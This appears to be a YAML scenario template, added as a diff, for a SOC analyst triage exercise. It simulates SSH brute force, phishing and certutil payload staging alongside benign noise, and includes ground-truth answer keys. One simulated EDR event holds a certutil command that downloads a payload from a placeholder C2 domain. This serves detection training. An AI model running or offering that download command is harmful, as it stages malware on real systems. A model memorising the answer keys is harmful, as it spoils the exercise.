@@ -1,0 +1,637 @@
+metadata:
+  id: "soc-f-mixed-signal-01"
+  version: 1
+  title: "L1 Reference: Mixed-Signal Shift"
+  level: "L1"
+  skillsTested:
+    - "soc_alert_triage"
+    - "soc_phishing_analysis"
+    - "soc_network_traffic"
+    - "soc_windows_logs"
+    - "soc_linux_logs"
+    - "soc_malware_triage"
+    - "soc_threat_intel"
+    - "soc_case_management"
+  estimatedMinutes:
+    min: 30
+    max: 50
+  difficultyRange:
+    - "beginner"
+    - "intermediate"
+    - "advanced"
+  author: "CyberBLADE SOC Curriculum Engineering"
+  reviewStatus: "approved"
+  reviewerNotes: "Reference family port of L1 demo scenario with parameterized attack chains and 1000-seed solvability proofs."
+
+environmentTemplate:
+  organizationArchetypes:
+    - "org_apex_dynamics"
+    - "org_vanguard_logistics"
+    - "org_strata_health"
+  assetDistribution:
+    workstations:
+      min: 4
+      max: 6
+    servers:
+      min: 2
+      max: 3
+    domainControllers:
+      min: 1
+      max: 1
+    mailGateways:
+      min: 1
+      max: 1
+  userDistribution:
+    totalUsers:
+      min: 5
+      max: 8
+    departments:
+      - "Finance"
+      - "Engineering"
+      - "IT Operations"
+      - "Human Resources"
+      - "Marketing"
+
+incidentTemplates:
+  - id: "inc-ssh-bruteforce"
+    titleTemplate: "External SSH Authentication Brute Force against {targetServer}"
+    category: "Authentication & Credential Access"
+    rootCauseTemplate: "External actor at {attackerIp} conducted automated credential dictionary attack against exposed SSH service on {targetServer}, achieving successful login."
+    mitreTags:
+      - "T1110.001" # Brute Force: Password Guessing
+      - "T1021.004" # Remote Services: SSH
+    stages:
+      - stageId: "stage-auth-bruteforce"
+        name: "External SSH Password Spray"
+        phase: "credential_access"
+        timingOffsetMinutes:
+          min: -80
+          max: -10
+        jitterMinutes: 3
+        telemetryGap:
+          probability: 0.15
+          hideAlert: false
+          hideRawEvents: false
+          reason: "Auth log sequence establishes high volume of authentication failures before success"
+        eventTemplates:
+          - source: "Authentication"
+            action: "failed_login"
+            messageTemplate: "sshd: 142 failed password attempts for user admin from external IP {attackerIp}"
+            fieldsTemplate:
+              service: "sshd"
+              source_ip: "{attackerIp}"
+              target_host: "{targetServer}"
+              failed_attempts: 142
+          - source: "Authentication"
+            action: "successful_login"
+            messageTemplate: "sshd: Accepted password for root from {attackerIp} port 49210 ssh2"
+            fieldsTemplate:
+              service: "sshd"
+              source_ip: "{attackerIp}"
+              target_host: "{targetServer}"
+              user: "root"
+        alertTemplates:
+          - ruleName: "Network IDS: Automated SSH Login Dictionary Attack"
+            source: "Network IDS"
+            severity: "HIGH"
+            summaryTemplate: "Rapid external SSH login failure burst detected against host '{targetServer}'"
+            relatedAssetBinding: "targetServer"
+            relatedUserBinding: "targetServer"
+            iocs:
+              - type: "ip"
+                valueTemplate: "{attackerIp}"
+            rawFieldsTemplate:
+              source_ip: "{attackerIp}"
+              target_host: "{targetServer}"
+              status: "burst_detected"
+              burst_count: 142
+          - ruleName: "Authentication: External Brute Force Culminating in Successful Logon"
+            source: "Authentication"
+            severity: "CRITICAL"
+            summaryTemplate: "External SSH authentication burst followed by root session on host '{targetServer}' from untrusted source IP {attackerIp}"
+            relatedAssetBinding: "targetServer"
+            relatedUserBinding: "targetServer"
+            iocs:
+              - type: "ip"
+                valueTemplate: "{attackerIp}"
+            rawFieldsTemplate:
+              source_ip: "{attackerIp}"
+              target_host: "{targetServer}"
+              status: "accepted"
+              burst_count: 142
+        groundTruth:
+          kind: "true_positive"
+          correctDisposition: "true_positive"
+          correctSeverity: "CRITICAL"
+          correctEscalation: true
+          targetTier: "tier2"
+          minimumEvidenceSet:
+            - "stage-auth-bruteforce"
+          acceptableAlternatives: []
+          debriefTemplate: "Confirmed external authentication compromise. Attacker from {attackerIp} guessed credentials and logged into {targetServer} as root."
+
+  - id: "inc-phishing-harvest"
+    titleTemplate: "Phishing Infiltration & Credential Harvesting against {victimUser}"
+    category: "Phishing & Initial Access"
+    rootCauseTemplate: "Targeted spear-phishing email delivered to {victimUserEmail} containing link to fake login portal at {phishingDomain}."
+    mitreTags:
+      - "T1566.002" # Phishing: Spearphishing Link
+      - "T1078.004" # Valid Accounts: Cloud/Internal Accounts
+    stages:
+      - stageId: "stage-phish-delivery"
+        name: "Inbound Phishing Delivery"
+        phase: "initial_access"
+        timingOffsetMinutes:
+          min: 15
+          max: 80
+        jitterMinutes: 2
+        telemetryGap:
+          probability: 0.10
+          hideAlert: false
+          hideRawEvents: false
+          reason: "Email gateway message trace remains visible even under partial filter bypass"
+        eventTemplates:
+          - source: "EmailGateway"
+            action: "email_delivered"
+            messageTemplate: "Inbound message from billing-update@{phishingDomain} delivered to {victimUserEmail}"
+            fieldsTemplate:
+              subject: "Urgent: Revised Vendor Remittance Invoice"
+              sender: "billing-update@{phishingDomain}"
+              recipient: "{victimUserEmail}"
+              extracted_urls: "https://{phishingDomain}/auth/login"
+        alertTemplates:
+          - ruleName: "Email Gateway: Suspicious Inbound URL from Newly Registered Domain"
+            source: "Email Gateway"
+            severity: "HIGH"
+            summaryTemplate: "Suspicious inbound email delivered to user '{victimUser}' with external link '{phishingDomain}'"
+            relatedUserBinding: "victimUser"
+            relatedAssetBinding: "victimAsset"
+            iocs:
+              - type: "domain"
+                valueTemplate: "{phishingDomain}"
+              - type: "email"
+                valueTemplate: "billing-update@{phishingDomain}"
+            rawFieldsTemplate:
+              sender: "billing-update@{phishingDomain}"
+              recipient: "{victimUserEmail}"
+              domain_age_days: 2
+              threat_feed_category: "Suspicious Dynamic DNS"
+          - ruleName: "EDR: Browser Process Spawned Authentication Prompt Link"
+            source: "EDR"
+            severity: "HIGH"
+            summaryTemplate: "Browser process navigated to suspicious credential harvesting URL hosted on external domain '{phishingDomain}'"
+            relatedUserBinding: "victimUser"
+            relatedAssetBinding: "victimAsset"
+            iocs:
+              - type: "domain"
+                valueTemplate: "{phishingDomain}"
+            rawFieldsTemplate:
+              process_name: "msedge.exe"
+              navigated_url: "https://{phishingDomain}/auth/login"
+              user: "{victimUser}"
+              status: "connected"
+        groundTruth:
+          kind: "true_positive"
+          correctDisposition: "true_positive"
+          correctSeverity: "HIGH"
+          correctEscalation: true
+          targetTier: "tier2"
+          minimumEvidenceSet:
+            - "stage-phish-delivery"
+          acceptableAlternatives: []
+          debriefTemplate: "Confirmed phishing delivery targeting {victimUser}. Sender domain {phishingDomain} is untrusted and hosts an active credential harvester."
+
+  - id: "inc-lolbin-certutil"
+    titleTemplate: "Living-Off-The-Land Binary Staging on {victimAsset}"
+    category: "Execution & Defense Evasion"
+    rootCauseTemplate: "Attacker utilized native Windows binary certutil.exe to download malicious secondary payload from {c2Domain}."
+    mitreTags:
+      - "T1218.011" # System Binary Proxy Execution: Certutil
+      - "T1105" # Ingress Tool Transfer
+    stages:
+      - stageId: "stage-certutil-execution"
+        name: "Certutil Ingress Payload Download"
+        phase: "execution"
+        timingOffsetMinutes:
+          min: 100
+          max: 210
+        jitterMinutes: 2
+        eventTemplates:
+          - source: "EDR"
+            action: "process_creation"
+            messageTemplate: "certutil.exe -urlcache -split -f https://{c2Domain}/stage2.bin C:\\Users\\Public\\update.bin"
+            fieldsTemplate:
+              process_name: "certutil.exe"
+              process_path: "{processPath}"
+              command_line: "{maliciousArgs}"
+              parent_process: "cmd.exe"
+        alertTemplates:
+          - ruleName: "EDR: Living-Off-The-Land Binary (certutil) Network Connection"
+            source: "EDR"
+            severity: "CRITICAL"
+            summaryTemplate: "Suspicious execution of certutil.exe downloading binary payload from external domain '{c2Domain}' on '{victimAsset}'"
+            relatedAssetBinding: "victimAsset"
+            relatedUserBinding: "victimUser"
+            iocs:
+              - type: "domain"
+                valueTemplate: "{c2Domain}"
+              - type: "hash"
+                valueTemplate: "{fileHash}"
+            rawFieldsTemplate:
+              process_name: "certutil.exe"
+              command_line: "{maliciousArgs}"
+              download_url: "https://{c2Domain}/stage2.bin"
+              destination_path: "C:\\Users\\Public\\update.bin"
+          - ruleName: "Network IDS: Outbound Binary File Transfer over HTTPS"
+            source: "Network IDS"
+            severity: "HIGH"
+            summaryTemplate: "Anomalous outbound SSL session retrieving raw binary payload from external host '{c2Domain}' on port 443"
+            relatedAssetBinding: "victimAsset"
+            relatedUserBinding: "victimUser"
+            iocs:
+              - type: "domain"
+                valueTemplate: "{c2Domain}"
+            rawFieldsTemplate:
+              protocol: "TLSv1.3"
+              server_name: "{c2Domain}"
+              bytes_received: 245760
+              action: "allowed"
+        groundTruth:
+          kind: "true_positive"
+          correctDisposition: "true_positive"
+          correctSeverity: "CRITICAL"
+          correctEscalation: true
+          targetTier: "tier2"
+          minimumEvidenceSet:
+            - "stage-certutil-execution"
+          acceptableAlternatives: []
+          debriefTemplate: "Critical living-off-the-land payload staging. certutil.exe was abused to download external binary from {c2Domain}."
+
+benignTemplates:
+  - id: "benign-backup-job"
+    name: "Nightly Automated Snapshot & Backup"
+    category: "Scheduled Jobs"
+    frequencyRange:
+      min: 4
+      max: 8
+    timePattern: "batch_window_nightly"
+    actorRole: "service_account"
+    eventTemplates:
+      - source: "Authentication"
+        action: "service_logon"
+        messageTemplate: "Service account 'svc-backup' authenticated successfully via Kerberos"
+        fieldsTemplate:
+          service: "backup-daemon"
+          user: "svc-backup"
+          status: "authenticated"
+          target_host: "{hostname}"
+    alertTemplates:
+      - ruleName: "Authentication: High-Volume Service Data Replication"
+        source: "Authentication"
+        severity: "MEDIUM"
+        summaryTemplate: "Scheduled database snapshot stream handled by service account 'svc-backup' on host '{hostname}'"
+        rawFieldsTemplate:
+          user: "svc-backup"
+          bytes_transferred: "42.8 GB"
+          operation: "scheduled_backup"
+          status: "completed"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      minimumEvidenceSet:
+        - "benign-backup-job"
+      acceptableAlternatives: []
+      debriefTemplate: "Legitimate automated snapshot and backup initiated by approved service principal 'svc-backup'."
+
+  - id: "benign-certutil-crl"
+    name: "Routine PKI Certificate Revocation Check"
+    category: "Administrative Activity"
+    frequencyRange:
+      min: 3
+      max: 6
+    timePattern: "business_hours"
+    actorRole: "system_utility"
+    eventTemplates:
+      - source: "EDR"
+        action: "process_creation"
+        messageTemplate: "certutil.exe -verify -urlcache http://pki.corp.internal/crl/root.crl"
+        fieldsTemplate:
+          process_name: "certutil.exe"
+          command_line: "-verify -urlcache http://pki.corp.internal/crl/root.crl"
+          target_host: "{hostname}"
+          status: "success"
+    alertTemplates:
+      - ruleName: "EDR: Living-Off-The-Land Binary Execution"
+        source: "EDR"
+        severity: "HIGH"
+        summaryTemplate: "Administrative utility certutil.exe executed with CRL verification flags on host '{hostname}'"
+        rawFieldsTemplate:
+          process_name: "certutil.exe"
+          command_line: "-verify -urlcache http://pki.corp.internal/crl/root.crl"
+          target_url: "http://pki.corp.internal/crl/root.crl"
+          status: "crl_valid"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      minimumEvidenceSet:
+        - "benign-certutil-crl"
+      acceptableAlternatives: []
+      debriefTemplate: "Routine PKI certificate revocation check against internal domain. Not an attack."
+
+  - id: "benign-vuln-scanner"
+    name: "Authorized Weekly Perimeter Vulnerability Scan"
+    category: "Vulnerability Scanning"
+    frequencyRange:
+      min: 5
+      max: 10
+    timePattern: "batch_window_nightly"
+    actorRole: "security_scanner"
+    eventTemplates:
+      - source: "Network IDS"
+        action: "port_scan"
+        messageTemplate: "TCP port sweep detected from scanner IP {scannerIp}"
+        fieldsTemplate:
+          source_ip: "{scannerIp}"
+          ports_scanned: 1024
+          target_host: "{hostname}"
+          status: "probed"
+    alertTemplates:
+      - ruleName: "Network IDS: Rapid Port Sweep Probe"
+        source: "Network IDS"
+        severity: "HIGH"
+        summaryTemplate: "Rapid port sweep probe from authorized internal vulnerability scanner IP {scannerIp} on '{hostname}'"
+        rawFieldsTemplate:
+          source_ip: "{scannerIp}"
+          ports_scanned: 1024
+          authorized_scanner: true
+          status: "scheduled_audit"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "MEDIUM"
+      correctEscalation: false
+      minimumEvidenceSet:
+        - "benign-vuln-scanner"
+      acceptableAlternatives: []
+      debriefTemplate: "Authorized vulnerability scanning from known scanner IP {scannerIp}. Baseline approved activity."
+
+  - id: "benign-patch-deployment"
+    name: "Central Systems Patch Rollout"
+    category: "Software Deployment"
+    frequencyRange:
+      min: 4
+      max: 8
+    timePattern: "batch_window_maintenance"
+    actorRole: "admin_endpoint"
+    eventTemplates:
+      - source: "EDR"
+        action: "package_installer"
+        messageTemplate: "systemd-update executed package upgrade sequence on host '{hostname}'"
+        fieldsTemplate:
+          process_name: "apt-get"
+          packages: "libssl3,openssh-client"
+          target_host: "{hostname}"
+          status: "installed"
+    alertTemplates:
+      - ruleName: "EDR: System Package Upgrade Sequence"
+        source: "EDR"
+        severity: "MEDIUM"
+        summaryTemplate: "Automated package deployment installer executed during scheduled maintenance on host '{hostname}'"
+        rawFieldsTemplate:
+          installer: "systemd-update"
+          operation: "patch_distribution"
+          target_host: "{hostname}"
+          status: "installed"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      minimumEvidenceSet:
+        - "benign-patch-deployment"
+      acceptableAlternatives: []
+      debriefTemplate: "Automated patch rollout during scheduled maintenance window."
+
+  - id: "benign-vpn-traveler"
+    name: "Remote VPN Connection from Roaming IP"
+    category: "Remote Access"
+    frequencyRange:
+      min: 3
+      max: 6
+    timePattern: "business_hours"
+    actorRole: "roaming_user"
+    eventTemplates:
+      - source: "Authentication"
+        action: "vpn_login"
+        messageTemplate: "VPN tunnel authenticated for '{username}' from roaming IP {roamingIp}"
+        fieldsTemplate:
+          user: "{username}"
+          source_ip: "{roamingIp}"
+          protocol: "WireGuard"
+          status: "connected"
+    alertTemplates:
+      - ruleName: "Firewall: New Geographic VPN Tunnel Established"
+        source: "Firewall"
+        severity: "LOW"
+        summaryTemplate: "Authenticated remote VPN tunnel session established for corporate employee '{username}' from roaming IP"
+        rawFieldsTemplate:
+          user: "{username}"
+          source_ip: "{roamingIp}"
+          mfa_verified: true
+          status: "connected"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      minimumEvidenceSet:
+        - "benign-vpn-traveler"
+      acceptableAlternatives: []
+      debriefTemplate: "Legitimate corporate VPN access by authenticated employee with multi-factor verification."
+
+  - id: "benign-sensor-flapping"
+    name: "Duplicate Sensor Trigger on Benign Keep-Alive"
+    category: "Telemetry Flapping"
+    frequencyRange:
+      min: 4
+      max: 8
+    timePattern: "anytime"
+    actorRole: "sensor_glitch"
+    eventTemplates:
+      - source: "Network IDS"
+        action: "protocol_anomaly"
+        messageTemplate: "Malformed HTTP keepalive header on legacy telemetry connection"
+        fieldsTemplate:
+          protocol: "HTTP/1.1"
+          keepalive_timeout: 300
+          target_host: "{hostname}"
+          status: "active"
+    alertTemplates:
+      - ruleName: "Network IDS: Protocol Header Parsing Anomaly"
+        source: "Network IDS"
+        severity: "LOW"
+        summaryTemplate: "Repetitive protocol anomaly sensor trigger observed on internal keep-alive session from '{hostname}'"
+        rawFieldsTemplate:
+          sensor_id: "suricata-dmz-01"
+          duplicate_count: 8
+          protocol: "HTTP/1.1"
+          status: "active"
+    groundTruth:
+      kind: "duplicate"
+      correctDisposition: "duplicate"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      minimumEvidenceSet:
+        - "benign-sensor-flapping"
+      acceptableAlternatives: []
+      debriefTemplate: "Known flapping sensor alert caused by benign legacy keep-alive traffic."
+
+  - id: "benign-pwd-reset"
+    name: "Self-Service Credential Reset"
+    category: "Identity Management"
+    frequencyRange:
+      min: 2
+      max: 5
+    timePattern: "business_hours"
+    actorRole: "standard_user"
+    eventTemplates:
+      - source: "Authentication"
+        action: "password_change"
+        messageTemplate: "Self-service password change succeeded for user '{username}'"
+        fieldsTemplate:
+          user: "{username}"
+          auth_method: "SSO_PORTAL"
+          target_host: "{hostname}"
+          status: "reset_done"
+    alertTemplates:
+      - ruleName: "Authentication: Multiple Failed Logons Followed by Password Change"
+        source: "Authentication"
+        severity: "MEDIUM"
+        summaryTemplate: "Self-service password update followed by transient authentication retries from corporate host '{hostname}'"
+        rawFieldsTemplate:
+          user: "{username}"
+          post_reset_retries: 3
+          auth_method: "SSO_PORTAL"
+          status: "synchronized"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      minimumEvidenceSet:
+        - "benign-pwd-reset"
+      acceptableAlternatives: []
+      debriefTemplate: "Routine self-service password update followed by transient logon sync delays."
+
+twinTemplates:
+  - id: "twin-certutil-execution"
+    name: "Living-Off-The-Land certutil.exe Twin Pair"
+    description: "Contrasts malicious external payload staging vs legitimate internal PKI CRL verification"
+    toolOrTechnique: "certutil.exe"
+    maliciousStageRef: "stage-certutil-execution"
+    benignTemplateRef: "benign-certutil-crl"
+    distinguishingEvidence: "Inspection of command-line arguments: malicious downloads binary from external untrusted domain via -urlcache -split -f; benign performs CRL verification against internal PKI server via -verify."
+    acceptableAlternatives: []
+
+  - id: "twin-authentication-burst"
+    name: "Remote Authentication Anomaly Twin Pair"
+    description: "Contrasts external automated brute-force compromise vs authorized roaming VPN access"
+    toolOrTechnique: "Remote Ingress Authentication"
+    maliciousStageRef: "stage-auth-bruteforce"
+    benignTemplateRef: "benign-vpn-traveler"
+    distinguishingEvidence: "Inspection of auth records: malicious contains 100+ password failures from untrusted external IP; benign is an authenticated single-session VPN tunnel with verified MFA."
+    acceptableAlternatives: []
+
+variationAxes:
+  incidentCount:
+    min: 2
+    max: 3
+  noiseRatio:
+    min: 0.65
+    max: 0.85
+  ambiguityCount:
+    min: 1
+    max: 3
+  telemetryGapCount:
+    min: 0
+    max: 1
+  targetAlertCount:
+    min: 30
+    max: 55
+  difficultyProfiles:
+    beginner:
+      incidentCount: 2
+      noiseRatio: 0.65
+      ambiguityCount: 1
+      telemetryGapCount: 0
+      targetAlertCount: 30
+      expectedScoreCeilingNaive: 55
+      expectedMinScoreReference: 85
+    intermediate:
+      incidentCount: 2
+      noiseRatio: 0.75
+      ambiguityCount: 2
+      telemetryGapCount: 1
+      targetAlertCount: 40
+      expectedScoreCeilingNaive: 55
+      expectedMinScoreReference: 85
+    advanced:
+      incidentCount: 3
+      noiseRatio: 0.82
+      ambiguityCount: 3
+      telemetryGapCount: 1
+      targetAlertCount: 50
+      expectedScoreCeilingNaive: 50
+      expectedMinScoreReference: 80
+
+debriefTemplates:
+  overallBriefingTemplate: |
+    Welcome to your Tier-1 SOC shift at {orgName}.
+    A queue of {alertCount} incoming telemetry alerts has arrived across EDR, Network IDS, Authentication, Email Gateway, and Firewall sensors.
+    Your mission:
+    1. Triage the alert queue methodically. Isolate active security incidents from benign administrative tasks and telemetry noise.
+    2. Provide an accurate disposition and defensible rationale for each alert.
+    3. Escalate verified attacks to Tier 2 and avoid unnecessary escalation of benign background activity.
+  generalGuidanceTemplate: |
+    Shift debrief for {orgName}:
+    In this shift, you investigated {alertCount} alerts encompassing {incidentCount} genuine security incidents alongside realistic background enterprise noise.
+    Key takeaways:
+    - Always correlate email gateway traces with external reputation before determining phishing dispositions.
+    - Differentiate legitimate system utility actions (such as internal PKI CRL lookups) from malicious living-off-the-land payload staging.
+    - Confirm authentication outcomes: multiple failed logon attempts only represent an incident if followed by unauthorized session establishment.
+
+hooks:
+  enrichmentHooks:
+    - id: "hook-whois-domain"
+      provider: "whois"
+      dataPoints:
+        - "creation_date"
+        - "registrar"
+    - id: "hook-ip-reputation"
+      provider: "reputation"
+      dataPoints:
+        - "abuse_confidence_score"
+        - "asn"
+  queryDatasetHooks:
+    - datasetName: "siem_telemetry_flow"
+      extraEventGenerators:
+        - "generate_dns_flows"
+        - "generate_firewall_denies"
+  evidenceViewHooks:
+    - id: "hook-auth-timeline"
+      viewType: "timeline"
+    - id: "hook-edr-tree"
+      viewType: "process_tree"
+  reportRubricHooks:
+    - sectionId: "executive_summary"
+      criteria:
+        - "Clear incident identification"
+        - "Accurate timeline synthesis"
+    - sectionId: "containment_recommendations"
+      criteria:
+        - "Host isolation recommendation"
+        - "Credential revocation notice"
